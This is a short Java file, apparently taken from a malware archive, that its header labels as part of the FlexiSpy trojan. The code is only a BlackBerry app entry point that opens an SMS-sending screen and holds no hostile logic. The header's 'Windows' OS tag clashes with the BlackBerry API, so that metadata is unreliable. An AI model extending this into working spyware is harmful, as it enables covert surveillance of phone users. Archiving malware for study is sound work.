/*
  name      FlexiSpy
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
import net.rim.device.api.ui.UiApplication;

public class SMSSendApplicationUI extends UiApplication {

	public static void main(String[] args) {
		SMSSendApplicationUI me = new SMSSendApplicationUI();
		SMSSendApplicationMainScreen appUi = new SMSSendApplicationMainScreen(me);
		me.pushScreen(appUi);
		me.enterEventDispatcher();
	}
}
